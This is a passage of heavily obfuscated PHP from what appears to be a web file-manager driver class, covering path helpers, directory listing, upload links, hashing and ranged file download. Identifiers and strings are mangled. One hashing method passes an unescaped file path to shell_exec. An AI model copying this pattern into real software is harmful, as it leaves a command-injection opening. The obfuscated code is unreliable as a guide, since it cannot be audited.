$¬°ÚÅ¯×[$ÏËŸ´ç¾[81]][$ÏËŸ´ç¾[79]] + $¬°ÚÅ¯×[$ÏËŸ´ç¾[81]][$ÏËŸ´ç¾[80]] + 1; } $this->update($¾•ëßóç); $this->sourceModelCopyFlag = !1; } public function sourceMove($¬ì’ô“) { $this->sourceRemove($¬ì’ô“, !1); } public function curlProgress($–ú’—æÃ, $ª¨÷ñğÚ, $ı×ÊŠ, $ÊÃ™’², $º¶ğ¡Ñï) { $ËîÂ¨«ú =& $_SERVER[ÏÒ Ì„]; $†®şèˆ =& $this->task; if ($º¶ğ¡Ñï > 0) { $†®şèˆ[$ËîÂ¨«ú[1059]] = $ËîÂ¨«ú[1644]; $†®şèˆ[$ËîÂ¨«ú[1627]] = $ËîÂ¨«ú[107]; if ($†®şèˆ[$ËîÂ¨«ú[1625]]) { $†®şèˆ[$ËîÂ¨«ú[1626]] = $º¶ğ¡Ñï; } if ($†®şèˆ[$ËîÂ¨«ú[1628]]) { $†®şèˆ[$ËîÂ¨«ú[1626]] = $º¶ğ¡Ñï + $†®şèˆ[$ËîÂ¨«ú[1628]]; } } else { if ($ı×ÊŠ > 0) { if ($†®şèˆ[$ËîÂ¨«ú[1625]] == $ª¨÷ñğÚ) { $†®şèˆ[$ËîÂ¨«ú[1626]] = $ı×ÊŠ; $†®şèˆ[$ËîÂ¨«ú[1059]] = $ËîÂ¨«ú[1645]; $†®şèˆ[$ËîÂ¨«ú[1627]] = $ËîÂ¨«ú[1127]; } } } $this->update(); } public function curlProgressStart($Úçå¡¢) { } public function curlProgressEnd($Û«“û) { $×èÔ”ë =& $_SERVER[ÏÒ Ì„]; $Ö…æÍ× =& $this->task; $ÀŸËè‹ = curl_getinfo($Û«“û); $õØÜœˆ = $ÀŸËè‹[$×èÔ”ë[1646]]; if ($õØÜœˆ == -1) { $õØÜœˆ = $ÀŸËè‹[$×èÔ”ë[1647]]; } if ($Ö…æÍ×[$×èÔ”ë[1627]] == $×èÔ”ë[107] && $õØÜœˆ) { $Ö…æÍ×[$×èÔ”ë[1628]] += $õØÜœˆ; } $this->update(); } } goto a‹œ¤ã¸®; c¢ñîŠ˜Ò: define($_SERVER[ÏÒ Ì„][239], 1); define($_SERVER[ÏÒ Ì„][240], 0); define($_SERVER[ÏÒ Ì„][241], 2); goto DÙè¾ô¢¹Ÿ; DÓœ¾ÍÏ„¾: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $ÓÀ–¦Ã =& $_SERVER[ÏÒ Ì„]; $this->objectDriver = array($ÓÀ–¦Ã[57], $ÓÀ–¦Ã[58], $ÓÀ–¦Ã[59], $ÓÀ–¦Ã[60], $ÓÀ–¦Ã[61], $ÓÀ–¦Ã[62], $ÓÀ–¦Ã[63], $ÓÀ–¦Ã[64], $ÓÀ–¦Ã[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¹¼êûğ‡) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¹¼êûğ‡, $_SERVER[ÏÒ Ì„][8]); } return $¹¼êûğ‡; } public function iconvApp($ü –‚Ä£) { return $ü –‚Ä£; } public function iconvSystem($¿ó¤àÃæ) { return $¿ó¤àÃæ; } public function iconvTo($°­ÎîÍæ, $©¤…’¹ğ, $ ÷“ÃÕ½) { $îŞ±Õï© =& $_SERVER[ÏÒ Ì„]; if (!$°­ÎîÍæ || !function_exists($îŞ±Õï©[66])) { return $°­ÎîÍæ; } static $±”İ‘Ÿõ = array(); $³¸¾ò¥â = $©¤…’¹ğ . $îŞ±Õï©[67] . $ ÷“ÃÕ½ . $îŞ±Õï©[68] . $°­ÎîÍæ; if (isset($±”İ‘Ÿõ[$³¸¾ò¥â])) { return $±”İ‘Ÿõ[$³¸¾ò¥â]; } if (function_exists($îŞ±Õï©[69])) { $Íñ®¸¯ä = @mb_convert_encoding($°­ÎîÍæ, $ ÷“ÃÕ½, $©¤…’¹ğ); } else { $Íñ®¸¯ä = @iconv($©¤…’¹ğ, $ ÷“ÃÕ½, $°­ÎîÍæ); } $Íñ®¸¯ä = $Íñ®¸¯ä ? $Íñ®¸¯ä : $°­ÎîÍæ; if (strstr($Íñ®¸¯ä, $îŞ±Õï©[70])) { $Íñ®¸¯ä = str_replace($îŞ±Õï©[70], $îŞ±Õï©[71], $Íñ®¸¯ä); } $±”İ‘Ÿõ[$©¤…’¹ğ . $îŞ±Õï©[67] . $ ÷“ÃÕ½ . $îŞ±Õï©[68] . $°­ÎîÍæ] = $Íñ®¸¯ä; $±”İ‘Ÿõ[$ ÷“ÃÕ½ . $îŞ±Õï©[67] . $©¤…’¹ğ . $îŞ±Õï©[68] . $°­ÎîÍæ] = $°­ÎîÍæ; $±”İ‘Ÿõ[$ ÷“ÃÕ½ . $îŞ±Õï©[67] . $©¤…’¹ğ . $îŞ±Õï©[68] . $Íñ®¸¯ä] = $°­ÎîÍæ; $±”İ‘Ÿõ[$©¤…’¹ğ . $îŞ±Õï©[67] . $ ÷“ÃÕ½ . $îŞ±Õï©[68] . $Íñ®¸¯ä] = $Íñ®¸¯ä; return $Íñ®¸¯ä; } public function getPathInner($ÃúóÜÄĞ) { $’…ÌáÙ = IO::init($ÃúóÜÄĞ); return $’…ÌáÙ->path; } public function getPathOuter($ö’„ëö¦) { $ÜÖ¹ØÈÈ =& $_SERVER[ÏÒ Ì„]; $Â…Ü÷ë¼ = strlen(trim($this->pathBase, $ÜÖ¹ØÈÈ[8])); $ö’„ëö¦ = substr(trim($ö’„ëö¦, $ÜÖ¹ØÈÈ[8]), $Â…Ü÷ë¼); return $this->pathDriver . $ÜÖ¹ØÈÈ[8] . ltrim($ö’„ëö¦, $ÜÖ¹ØÈÈ[8]); } public function isParentOf($’ùÇÃ¬—, $‰—Ÿœéü) { $”åÁÍ‰÷ =& $_SERVER[ÏÒ Ì„]; $’ùÇÃ¬— = rtrim(strtolower($’ùÇÃ¬—), $”åÁÍ‰÷[8]) . $”åÁÍ‰÷[8]; $‰—Ÿœéü = rtrim(strtolower($‰—Ÿœéü), $”åÁÍ‰÷[8]) . $”åÁÍ‰÷[8]; $‡ƒ¾‡—Â = strpos($‰—Ÿœéü, $’ùÇÃ¬—) === 0; return $‡ƒ¾‡—Â; } public function getType() { $””ı¼à³ =& $_SERVER[ÏÒ Ì„]; $Ïû‰›²„ = str_replace($””ı¼à³[72], $””ı¼à³[33], get_class($this)); return strtolower($Ïû‰›²„); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Æ–ä±®, $¡Û¯“Òí) { $²ƒ»©ïØ =& $_SERVER[ÏÒ Ì„]; $ÁÅ­æ¤ = rtrim($Æ–ä±®, $²ƒ»©ïØ[8]) . $²ƒ»©ïØ[8] . $¡Û¯“Òí; $ş§ò¦Ë‚ = $this->exist($ÁÅ­æ¤); return $ş§ò¦Ë‚ ? $ÁÅ­æ¤ : !1; } public function setModifyTime($¦È¼¼€, $Íğ±¯Ö‡ = '') { } public function renameObject($š¢…Ïïá, $­çÔÓ²î) { $Ãé¦æ± =& $_SERVER[ÏÒ Ì„]; $×İ ´ = $­çÔÓ²î; Hook::trigger($Ãé¦æ±[73], $this, $š¢…Ïïá, $this, $this->pathFather($š¢…Ïïá) . $­çÔÓ²î); $š¢…Ïïá = $this->getPathOuter($š¢…Ïïá); $­çÔÓ²î = $this->pathFather($š¢…Ïïá) . $­çÔÓ²î; if (IO::isFile($š¢…Ïïá)) { $Â ¯­÷İ = IO::copy($š¢…Ïïá, $this->pathFather($š¢…Ïïá), REPEAT_RENAME_FOLDER, $×İ ´); if ($Â ¯­÷İ) { IO::remove($š¢…Ïïá); } } else { $Â ¯­÷İ = IO::mkdir($­çÔÓ²î); if (!$Â ¯­÷İ) { return !1; } $úæé„Ô… = IO::listPath($š¢…Ïïá, !0); $®õ©Ë ñ = array_merge($úæé„Ô…[$Ãé¦æ±[74]], $úæé„Ô…[$Ãé¦æ±[75]]); foreach ($®õ©Ë ñ as $ÏÛµÆìæ) { IO::move($ÏÛµÆìæ[$Ãé¦æ±[76]], $­çÔÓ²î, REPEAT_RENAME_FOLDER); } IO::remove($š¢…Ïïá); } return $Â ¯­÷İ ? $­çÔÓ²î : !1; } public function tempFile($Ñ•¿¾ÙÙ = '', $–Ü¾İÈ = '') { if (!$Ñ•¿¾ÙÙ) { $Ñ•¿¾ÙÙ = rand_string(15); } $¿ÄèÅŸÔ = TEMP_FILES . rand_string(15) . $_SERVER[ÏÒ Ì„][8]; @mkdir($¿ÄèÅŸÔ, DEFAULT_PERRMISSIONS, !0); $ÀÕ¢¸»¡ = $¿ÄèÅŸÔ . $Ñ•¿¾ÙÙ; @touch($ÀÕ¢¸»¡); if ($–Ü¾İÈ) { file_put_contents($ÀÕ¢¸»¡, $–Ü¾İÈ); } return $ÀÕ¢¸»¡; } public function tempFileRemve($ò¬÷ÅÑÏ) { @unlink($ò¬÷ÅÑÏ); @rmdir($this->pathFather($ò¬÷ÅÑÏ)); } public function mkfile($­ªĞÔú½, $Õ§ØÛ‚† = '', $ış÷àÔ = REPEAT_RENAME) { } public function mkdir($«“…šÖÕ, $–áŠ·”ç = REPEAT_SKIP) { } public function delFile($Œ¤‘¼ğ) { } public function delFolder($–­©õËø) { } public function copyFile($¾ü‹ëïÔ, $Î´Á¹½‘) { } public function moveFile($ƒ™ÑÖçó, $˜æ«™³–) { } public function remove($¥®ÇİÒÂ) { if ($this->isFile($¥®ÇİÒÂ)) { return $this->delFile($¥®ÇİÒÂ); } return $this->delFolder($¥®ÇİÒÂ); } public function rename($·Íš¶—¢, $¾€ÁåãÒ) { } public function exist($©ñ—ìÙ) { } public function findByHash($Ûñ€®± = '', $²»á½¸ = '') { return !1; } public function isFile($›ˆÍ„±İ) { } public function isFolder($”¦ß¾ú¢) { } public function size($÷Ç¶ŸÇå) { } public function info($ÀÌ±µÏ¨) { } public function infoSimple($—ÓæÛ•) { return $this->info($—ÓæÛ•); } public function infoAuth($Šß‘¨›¯) { return $this->info($Šß‘¨›¯); } public function infoFull($úû¸øâ²) { return $this->info($úû¸øâ²); } public function infoWithChildren($µ–²Òœ¸) { $ĞÆç„Ì‹ =& $_SERVER[ÏÒ Ì„]; static $ò’¸ÅÓ² = array(); if (isset($ò’¸ÅÓ²[$µ–²Òœ¸])) { return $ò’¸ÅÓ²[$µ–²Òœ¸]; } $Ô‡øôŒ“ = $this->info($µ–²Òœ¸); if ($Ô‡øôŒ“ && $Ô‡øôŒ“[$ĞÆç„Ì‹[29]] == $ĞÆç„Ì‹[77]) { $µ¡Úï¯í = array($ĞÆç„Ì‹[78] => 0, $ĞÆç„Ì‹[79] => 0, $ĞÆç„Ì‹[80] => 0); $this->infoChildren($µ–²Òœ¸, $µ¡Úï¯í); $Ô‡øôŒ“[$ĞÆç„Ì‹[78]] = $µ¡Úï¯í[$ĞÆç„Ì‹[78]]; $Ô‡øôŒ“[$ĞÆç„Ì‹[81]] = array($ĞÆç„Ì‹[82] => $µ¡Úï¯í[$ĞÆç„Ì‹[79]], $ĞÆç„Ì‹[83] => $µ¡Úï¯í[$ĞÆç„Ì‹[80]]); $ò’¸ÅÓ²[$µ–²Òœ¸] = $Ô‡øôŒ“; } return $Ô‡øôŒ“; } public function listPath($ä™¹“š¦, $ñ¤·ó¥ = false) { } public function has($ığìÈĞ, $Ü¨ûÏ‹Ë = false, $Ê¼³±Ã½ = false) { } public function canRead($Üğâº’·) { } public function canWrite($®Š·©¡ò) { } public function getContent($¾±ŞŞî²) { } public function setContent($¾ó¢ƒ§É, $­¸§å§ = '') { } protected function infoChildren($ôğ¾¢â¿, &$ìÁö³”…) { $Œ•ã‚’ =& $_SERVER[ÏÒ Ì„]; check_abort_echo(); $äõó‚‰­ = $this->listPath($ôğ¾¢â¿, !0); $äõó‚‰­ = array_merge($äõó‚‰­[$Œ•ã‚’[75]], $äõó‚‰­[$Œ•ã‚’[74]]); foreach ($äõó‚‰­ as $Ò¿€Ù—¦) { if ($Ò¿€Ù—¦[$Œ•ã‚’[29]] == $Œ•ã‚’[77]) { $ìÁö³”…[$Œ•ã‚’[80]]++; $»ƒ­Ê… = $this->getPathInner($Ò¿€Ù—¦[$Œ•ã‚’[76]]); $this->infoChildren($»ƒ­Ê…, $ìÁö³”…); } else { $ìÁö³”…[$Œ•ã‚’[79]]++; $ìÁö³”…[$Œ•ã‚’[78]] += $Ò¿€Ù—¦[$Œ•ã‚’[78]]; } } } public function fileSubstr($øÉ›æ•É, $§øµ„Œ, $–ü·÷íÖ) { } public function listAll($Ù±‡ñâÔ) { } public function listAllMake($û¿Ö·ş, &$Àô¶²±) { $Æê–ßõã =& $_SERVER[ÏÒ Ì„]; check_abort_echo(); $ı¨²Õò¹ = $this->listPath($û¿Ö·ş, !0); if (!$ı¨²Õò¹) { return; } $†Ãµ¬› = array_merge($ı¨²Õò¹[$Æê–ßõã[75]], $ı¨²Õò¹[$Æê–ßõã[74]]); foreach ($†Ãµ¬› as $·Ğ´ˆğÓ) { $ŞÒœĞğ½ = $·Ğ´ˆğÓ[$Æê–ßõã[29]] == $Æê–ßõã[77]; $—œÂªÆ = array($Æê–ßõã[76] => $·Ğ´ˆğÓ[$Æê–ßõã[76]], $Æê–ßõã[77] => $ŞÒœĞğ½); if (isset($·Ğ´ˆğÓ[$Æê–ßõã[78]])) { $—œÂªÆ[$Æê–ßõã[78]] = $·Ğ´ˆğÓ[$Æê–ßõã[78]]; } if (isset($·Ğ´ˆğÓ[$Æê–ßõã[84]])) { $—œÂªÆ[$Æê–ßõã[84]] = $·Ğ´ˆğÓ[$Æê–ßõã[84]]; } if (!$ŞÒœĞğ½) { $Àô¶²±[] = $—œÂªÆ; continue; } $Àô¶²±[] = $—œÂªÆ; $“‡šËåí = $·Ğ´ˆğÓ[$Æê–ßõã[76]]; $¦ÆÊÑ‡‡ = $this->pathDriver; if (substr($·Ğ´ˆğÓ[$Æê–ßõã[76]], 0, strlen($¦ÆÊÑ‡‡)) == $¦ÆÊÑ‡‡) { $“‡šËåí = substr($“‡šËåí, strlen($¦ÆÊÑ‡‡)); } $this->listAllMake($“‡šËåí, $Àô¶²±); } } public function listAllSimple($Ñƒœî‰â) { $®Àê™’Ç =& $_SERVER[ÏÒ Ì„]; $Ô»Ôê¶˜ = array(); $ÉÂ‡Ù’µ = $this->listAll($Ñƒœî‰â); $Æ–áÏ† = $this->getPathOuter($Ñƒœî‰â); foreach ($ÉÂ‡Ù’µ as $›²ÕƒĞÍ) { $†Íš£Ç­ = $›²ÕƒĞÍ[$®Àê™’Ç[76]]; $âÇ™¨òà = $›²ÕƒĞÍ[$®Àê™’Ç[76]]; if (isset($›²ÕƒĞÍ[$®Àê™’Ç[85]])) { $†Íš£Ç­ = $›²ÕƒĞÍ[$®Àê™’Ç[85]][$®Àê™’Ç[76]]; $›²ÕƒĞÍ[$®Àê™’Ç[78]] = $›²ÕƒĞÍ[$®Àê™’Ç[85]][$®Àê™’Ç[78]]; $›²ÕƒĞÍ[$®Àê™’Ç[84]] = $›²ÕƒĞÍ[$®Àê™’Ç[85]][$®Àê™’Ç[84]]; } else { $âÇ™¨òà = substr($›²ÕƒĞÍ[$®Àê™’Ç[76]], strlen(get_path_father($Æ–áÏ†))); $âÇ™¨òà = $®Àê™’Ç[8] . ltrim($âÇ™¨òà, $®Àê™’Ç[8]); } $ÏÆ£®İú = array($®Àê™’Ç[76] => $âÇ™¨òà, $®Àê™’Ç[77] => $›²ÕƒĞÍ[$®Àê™’Ç[77]]); if (isset($›²ÕƒĞÍ[$®Àê™’Ç[78]]) && !$›²ÕƒĞÍ[$®Àê™’Ç[77]]) { $ÏÆ£®İú[$®Àê™’Ç[78]] = $›²ÕƒĞÍ[$®Àê™’Ç[78]]; } if (isset($›²ÕƒĞÍ[$®Àê™’Ç[84]])) { $ÏÆ£®İú[$®Àê™’Ç[84]] = $›²ÕƒĞÍ[$®Àê™’Ç[84]]; } if (!$›²ÕƒĞÍ[$®Àê™’Ç[77]]) { $ÏÆ£®İú[$®Àê™’Ç[86]] = $†Íš£Ç­; } $Ô»Ôê¶˜[] = $ÏÆ£®İú; } return $Ô»Ôê¶˜; } public function upload($’ŞˆÃ , $ªÓ¶™ç­, $ÜÁº³¦Ì = false, $›í¾Ô· = REPEAT_REPLACE) { } public function uploadFileByID($îÇ£óŒŸ, $ÀãÇ÷óâ, $ÃãÎşÜˆ) { } public function uploadFileByPath($›û¹°÷, $©¾î‚ÚÓ, $Ş‡„ƒ©ª = array()) { } public function isUploadServer() { $ã²øşœ¿ =& $_SERVER[ÏÒ Ì„]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ã²øşœ¿[87]) { return !0; } return $GLOBALS[$ã²øşœ¿[6]][$ã²øşœ¿[88]][$ã²øşœ¿[89]]; } public function isFileOutServer() { $ñÇ†•ıº =& $_SERVER[ÏÒ Ì„]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ñÇ†•ıº[87]) { return !0; } return $GLOBALS[$ñÇ†•ıº[6]][$ñÇ†•ıº[88]][$ñÇ†•ıº[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($€±Ç„ªè) { $À† ”Œ =& $_SERVER[ÏÒ Ì„]; if (!$this->isCdnHost()) { return $€±Ç„ªè; } return str_replace(trim(get_url_root($€±Ç„ªè), $À† ”Œ[8]), trim($this->cdnHost, $À† ”Œ[8]), $€±Ç„ªè); } public function uploadLink($ÓŞÚûæÓ, $šÇéÌ¦ = 0) { $¶íã‹ÛÄ =& $_SERVER[ÏÒ Ì„]; if ($this->isUploadServer()) { return; } $¦® Ê— = $this->getType(); if (!in_array($¦® Ê—, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¦ëÕ¶·— = 1024 * 1024 * 10; $¹Ğä«°ü = $šÇéÌ¦ <= $¦ëÕ¶·— ? $¶íã‹ÛÄ[91] : $¶íã‹ÛÄ[92]; $™£¡õñÕ = (!$šÇéÌ¦ ? 1 : ceil($šÇéÌ¦ / pow(1024, 3))) * 3600 * 4; $±ÃìÏ³’ = $this->{$¹Ğä«°ü}($ÓŞÚûæÓ, $™£¡õñÕ); if ($±ÃìÏ³’) { $±ÃìÏ³’[$¶íã‹ÛÄ[93]] = $ÓŞÚûæÓ; $±ÃìÏ³’[$¶íã‹ÛÄ[94]] = $¦® Ê—; } return $±ÃìÏ³’; } public function uploadFormData($ø•šÃ, $Ø­†…Üó = 3600) { } public function multiUploadFormData($§ÇëÏÈ, $Âößì‹¹ = 3600) { } public function download($«†ÎØÑÓ, $¸˜˜ğ) { } public function ext($¹Â¬³Ñ£) { $ì§Ùæ =& $_SERVER[ÏÒ Ì„]; if (strpos($¹Â¬³Ñ£, $ì§Ùæ[8]) === -1) { $ƒ¡‰•Ç° = $¹Â¬³Ñ£; } else { $ƒ¡‰•Ç° = $this->pathThis($¹Â¬³Ñ£); } $©İëˆí¶ = $ì§Ùæ[33]; if (strstr($ƒ¡‰•Ç°, $ì§Ùæ[95])) { $©İëˆí¶ = substr($ƒ¡‰•Ç°, strrpos($ƒ¡‰•Ç°, $ì§Ùæ[95]) + 1); $©İëˆí¶ = strtolower($©İëˆí¶); } if (strlen($©İëˆí¶) > 3 && preg_match($ì§Ùæ[96], $©İëˆí¶, $Œ—úß©¬)) { $©İëˆí¶ = $ì§Ùæ[33]; } return $©İëˆí¶; } public function pathThis($§÷­Œ˜) { $×‹éôŒ =& $_SERVER[ÏÒ Ì„]; $§÷­Œ˜ = str_replace($×‹éôŒ[97], $×‹éôŒ[8], rtrim($§÷­Œ˜, $×‹éôŒ[8])); $–Šşôı† = strrpos($§÷­Œ˜, $×‹éôŒ[8]); if ($–Šşôı† === !1) { return $§÷­Œ˜; } return substr($§÷­Œ˜, $–Šşôı† + 1); } public function pathFather($Åà²¹¯ğ) { $¯³Ë”Ÿ =& $_SERVER[ÏÒ Ì„]; $Åà²¹¯ğ = str_replace($¯³Ë”Ÿ[97], $¯³Ë”Ÿ[8], rtrim($Åà²¹¯ğ, $¯³Ë”Ÿ[8])); $½©çå = strrpos($Åà²¹¯ğ, $¯³Ë”Ÿ[8]); if ($½©çå === !1) { return $¯³Ë”Ÿ[33]; } return substr($Åà²¹¯ğ, 0, $½©çå + 1); } public function hashSimple($›½Ò½ëœ) { $µ­ĞçÓ =& $_SERVER[ÏÒ Ì„]; if (!$›½Ò½ëœ) { return md5($µ­ĞçÓ[33]); } $ÀØ—£ÔÚ = $this->size($›½Ò½ëœ); $ò° Àí = 200; $ÀŒ¥£‹Ò = 50; if ($ÀØ—£ÔÚ <= $ò° Àí * $ÀŒ¥£‹Ò) { return $this->hashMd5($›½Ò½ëœ) . $ÀØ—£ÔÚ; } $ÀÚçñÚ = intval($ÀØ—£ÔÚ / $ÀŒ¥£‹Ò); $“‡±ÔŸ§ = $µ­ĞçÓ[33]; for ($¥”¤¨–ø = 0; $¥”¤¨–ø < $ÀŒ¥£‹Ò; $¥”¤¨–ø++) { $“‡±ÔŸ§ .= $this->fileSubstr($›½Ò½ëœ, $ÀÚçñÚ * $¥”¤¨–ø, $ò° Àí); } $“‡±ÔŸ§ .= $this->fileSubstr($›½Ò½ëœ, $ÀØ—£ÔÚ - $ò° Àí, $ò° Àí); return md5($“‡±ÔŸ§) . $ÀØ—£ÔÚ; } public static $md5Cache = array(); public function hashMd5($¦ìò†ğ¸) { if (!$¦ìò†ğ¸) { return md5($_SERVER[ÏÒ Ì„][33]); } $¦ìò†ğ¸ = $this->iconvSystem($¦ìò†ğ¸); if (isset(self::$md5Cache[$¦ìò†ğ¸])) { return self::$md5Cache[$¦ìò†ğ¸]; } self::$md5Cache[$¦ìò†ğ¸] = $this->hashMd5Shell($¦ìò†ğ¸); if (!self::$md5Cache[$¦ìò†ğ¸]) { self::$md5Cache[$¦ìò†ğ¸] = @md5_file($¦ìò†ğ¸); } return self::$md5Cache[$¦ìò†ğ¸]; } private function hashMd5Shell($‹®²¹«¤) { $ËÎ§¢àŸ =& $_SERVER[ÏÒ Ì„]; if (!$‹®²¹«¤) { return md5($ËÎ§¢àŸ[33]); } if (!function_exists($ËÎ§¢àŸ[98])) { return !1; } $€Ë÷ûá = array($ËÎ§¢àŸ[99], $ËÎ§¢àŸ[100]); $Ü§ı–”è = Cache::get($ËÎ§¢àŸ[101]); if (!$Ü§ı–”è) { $Ò¦“£ÓÉ = BASIC_PATH . $ËÎ§¢àŸ[102]; $ÜÎ…åÈ¸ = md5_file($Ò¦“£ÓÉ); $Ü§ı–”è = $ËÎ§¢àŸ[103]; foreach ($€Ë÷ûá as $†ó™­­) { $‘ÔàÒ¢ = shell_exec($†ó™­­ . "\40\x22{$Ò¦“£ÓÉ}\42"); if ($‘ÔàÒ¢ && substr(trim($‘ÔàÒ¢), 0, 32) == $ÜÎ…åÈ¸) { $Ü§ı–”è = $†ó™­­; break; } } Cache::set($ËÎ§¢àŸ[101], $Ü§ı–”è, 3600); } if ($Ü§ı–”è == $ËÎ§¢àŸ[103]) { return !1; } $‘ÔàÒ¢ = shell_exec($Ü§ı–”è . "\x20\42{$‹®²¹«¤}\42"); $‘ÔàÒ¢ = str_replace($ËÎ§¢àŸ[104], $ËÎ§¢àŸ[33], $‘ÔàÒ¢); return substr($‘ÔàÒ¢, 0, 32); } public function link($Ö¤àâÚâ) { return $Ö¤àâÚâ; } public function fileOut($êƒÂ¯®ğ, $ñ‹àÁ—« = false, $ÓŸÎº–÷ = false, $ÊÍÑß¶Í = '') { $€æ˜ö·Ã =& $_SERVER[ÏÒ Ì„]; $this->cacheMethod(null, null); if (!$êƒÂ¯®ğ || !$this->exist($êƒÂ¯®ğ)) { show_json(LNG($€æ˜ö·Ã[105]), !1, $ÓŸÎº–÷); } $²®¬å‚ = $this->getType() == $€æ˜ö·Ã[106]; $˜Åï¬… = $GLOBALS[$€æ˜ö·Ã[6]][$€æ˜ö·Ã[88]][$€æ˜ö·Ã[107]][$€æ˜ö·Ã[108]]; $ê¯´”İ¡ = (double) $GLOBALS[$€æ˜ö·Ã[6]][$€æ˜ö·Ã[88]][$€æ˜ö·Ã[107]][$€æ˜ö·Ã[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¡ÁëíóÉ = $this->infoFull($êƒÂ¯®ğ); $¬­ıªıö = $¡ÁëíóÉ[$€æ˜ö·Ã[78]]; $ÆóÅçÂæ = gmdate($€æ˜ö·Ã[110], $¡ÁëíóÉ[$€æ˜ö·Ã[84]]); $ñÂ¸ œ = $ÓŸÎº–÷ ? $ÓŸÎº–÷ : $this->iconvApp($¡ÁëíóÉ[$€æ˜ö·Ã[28]]); $Ó—¸ìì = 0; $Š§‡å˜à = $¬­ıªıö - 1; $óé æ¾š = $this->ext($ñÂ¸ œ); if (in_array($óé æ¾š, array($€æ˜ö·Ã[111], $€æ˜ö·Ã[112], $€æ˜ö·Ã[113], $€æ˜ö·Ã[114]))) { $óé æ¾š = $€æ˜ö·Ã[115]; } if (!$ÊÍÑß¶Í) { $ÊÍÑß¶Í = md5($ÆóÅçÂæ . $this->hashSimple($êƒÂ¯®ğ)); } $ÊÍÑß¶Í = $€æ˜ö·Ã[116] . $ÊÍÑß¶Í . $€æ˜ö·Ã[116]; $³£ş­„ = get_file_mime($óé æ¾š); if (strstr($³£ş­„, $€æ˜ö·Ã[117])) { $³£ş­„ = $³£ş­„ . $€æ˜ö·Ã[118]; } if ($ñ‹àÁ—« === !1 && !mime_support($³£ş­„)) { $ñ‹àÁ—« = !0; $³£ş­„ = $€æ˜ö·Ã[119]; } header($€æ˜ö·Ã[120]); header($€æ˜ö·Ã[121] . $³£ş­„); $›ÚÚŠ™Ó = rawurlencode($ñÂ¸ œ); $›ÚÚŠ™Ó = $€æ˜ö·Ã[116] . $›ÚÚŠ™Ó . $€æ˜ö·Ã[122] . $›ÚÚŠ™Ó; if ($ñ‹àÁ—«) { header($€æ˜ö·Ã[123]); header($€æ˜ö·Ã[124] . $›ÚÚŠ™Ó); } else { header($€æ˜ö·Ã[125] . $›ÚÚŠ™Ó); } header($€æ˜ö·Ã[126] . gmdate($€æ˜ö·Ã[110], time() + 3600 * 24 * 30) . $€æ˜ö·Ã[127]); header($€æ˜ö·Ã[128]); header($€æ˜ö·Ã[129]); header($€æ˜ö·Ã[130]); if (isset($_SERVER[$€æ˜ö·Ã[131]]) && strtotime($_SERVER[$€æ˜ö·Ã[131]]) == $¡ÁëíóÉ[$€æ˜ö·Ã[84]]) { header($€æ˜ö·Ã[132], !0, 304); die; } if (isset($_SERVER[$€æ˜ö·Ã[133]]) && $_SERVER[$€æ˜ö·Ã[133]] == $ÊÍÑß¶Í) { header($€æ˜ö·Ã[134] . $ÊÍÑß¶Í, !0, 304); die; } header($€æ˜ö·Ã[134] . $ÊÍÑß¶Í); header($€æ˜ö·Ã[135] . $ÆóÅçÂæ . $€æ˜ö·Ã[127]); header($€æ˜ö·Ã[136] . $ñÂ¸ œ); header($€æ˜ö·Ã[137]); header($€æ˜ö·Ã[138] . $¬­ıªıö); header($€æ˜ö·Ã[139]); if (!$ñ‹àÁ—« && $óé æ¾š == $€æ˜ö·Ã[140]) { if ($¬­ıªıö > 1024 * 1024 * 5) { die; } $«•…â¢Â = $this->getContent($êƒÂ¯®ğ); $«•…â¢Â = Html::clearSVG($«•…â¢Â); header($€æ˜ö·Ã[141] . strlen($«•…â¢Â)); echo $«•…â¢Â; die; } $ï³¢ü‘ü = strtolower($_SERVER[$€æ˜ö·Ã[142]]); if ($²®¬å‚ && $ï³¢ü‘ü && $˜Åï¬…) { if (strstr($ï³¢ü‘ü, $€æ˜ö·Ã[143])) { header($€æ˜ö·Ã[144] . $êƒÂ¯®ğ); } else { if (strstr($ï³¢ü‘ü, $€æ˜ö·Ã[145])) { header($€æ˜ö·Ã[146] . $êƒÂ¯®ğ); } else { if (strstr($ï³¢ü‘ü, $€æ˜ö·Ã[147])) { header($€æ˜ö·Ã[148] . $êƒÂ¯®ğ); } } } if ($ê¯´”İ¡) { header($€æ˜ö·Ã[149] . $ê¯´”İ¡); } return; } if (isset($_SERVER[$€æ˜ö·Ã[150]])) { if (preg_match($€æ˜ö·Ã[151], $_SERVER[$€æ˜ö·Ã[150]], $èÒûÏªï)) { $Ó—¸ìì = intval($èÒûÏªï[1]); if (!empty($èÒûÏªï[2])) { $Š§‡å˜à = intval($èÒûÏªï[2]); } } header($€æ˜ö·Ã[152]); header("\103\x6f\x6e\x74\x65\156\x74\x2d\x52\x61\156\x67\145\x3a\x20\142\171\x74\x65\163\40{$Ó—¸ìì}\55{$Š§‡å˜à}\x2f" . $¬­ıªıö); } else { header($€æ˜ö·Ã[153]); } $õĞ’›ã = !0; if ($_SERVER[$€æ˜ö·Ã[154]] == $€æ˜ö·Ã[155] && $¬­ıªıö > 1204 * 1024 * 1024 * 2) { $õĞ’›ã = !1; } if ($õĞ’›ã) { header($€æ˜ö·Ã[156] . ($Š§‡å˜à - $Ó—¸ìì + 1)); } if ($_SERVER[$€æ˜ö·Ã[157]] == $€æ˜ö·Ã[158]) { return; } $ùîñ„Åé = 1024 * 100; $ËäÒ— = 0; if ($ê¯´”İ¡) { $ËäÒ— = intval(1000 * 1000 * ($ùîñ„Åé / $ê¯´”İ¡)); } while ($Ó—¸ìì <= $Š§‡å˜à) { $í¥ÌÒ = timeFloat(); check_abort(); $Íá§ƒæ¤ = $Š§‡å˜à - $Ó—¸ìì + 1; if ($Íá§ƒæ¤ <= $ùîñ„Åé) { $ùîñ„Åé = $Íá§ƒæ¤; } echo $this->fileSubstr($êƒÂ¯®ğ, $Ó—¸ìì, $ùîñ„Åé); $Ó—¸ìì += 